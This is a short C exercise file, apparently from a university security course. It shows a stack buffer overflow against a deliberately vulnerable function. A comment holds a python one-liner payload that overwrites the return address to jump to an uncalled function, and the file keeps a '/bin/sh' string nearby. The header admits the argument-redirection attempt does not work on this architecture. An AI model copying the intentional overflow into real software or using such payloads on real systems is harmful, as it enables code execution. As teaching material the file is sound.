/**
 * Author: Nalam V S S Krishna Chaitanya,
 * Details: CS13B021, IIT Madras.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * This file tried to demonstrate the changing of the argument by overflowing
 * the stack with the required arguments placed on it. However it is not
 * possible as the arguments are passed through registers.
 */

char *not_used = "/bin/sh";

void not_called()
{
	printf("Not quite a shell...\n");
	system("/bin/date");
	exit(0);
}

void vulnerable_function(char *string)
{
	char buffer[96];
	memcpy(buffer,string,96+8+8+8+8);
	memcpy(buffer+108,"\x00\x00\x00\x00",4);
	memcpy(buffer+112,"/bin/sh",8);
}


// "$(python -c 'print "A"*96+"B"*8+"\xf0\x04\x40\x00\x00\x00\x00\x00"')"

int main(int argc,char **argv)
{
	vulnerable_function(argv[1]);
	return 0;
}
